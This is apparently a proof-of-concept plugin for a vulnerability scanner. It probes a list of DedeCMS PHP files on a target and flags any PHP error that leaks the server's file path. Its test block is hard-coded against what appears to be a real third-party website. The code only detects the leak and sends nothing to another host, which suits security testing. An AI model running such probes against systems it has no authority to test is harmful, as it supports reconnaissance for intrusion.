#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
POC Name  : dedecms 路径泄漏大全
Author    : a
mail      : a@lcx.cc
"""

import re
def assign(service, arg):
    if service == 'dedecms':
        return True, arg

def audit(arg):
    payloads = [
        'member/inc/config_pay_yeepay.php', 
        'member/inc/config_pay_tenpay.php',
        'member/inc/config_pay_nps.php ',
        'member/inc/config_pay_cbpayment.php ',
        'member/inc/config_pay_alipay.php',
        'include/downmix.inc.php'
        ]
    for payload in payloads:
        url = arg + payload
        code, head,res, errcode, _ = curl.curl2(url)
        if code==200:
            m = re.search('in <b>([^<]+)</b>', res)
            if m:
                security_note(url)
        #剩下的西瓜皮的过滤型插件就会自动识别泄露的路径了，不用再进行过滤和判断和警报了。

if __name__ == '__main__':
    from dummy import *
    audit(assign('dedecms', 'http://www.xgyxchina.com/')[1])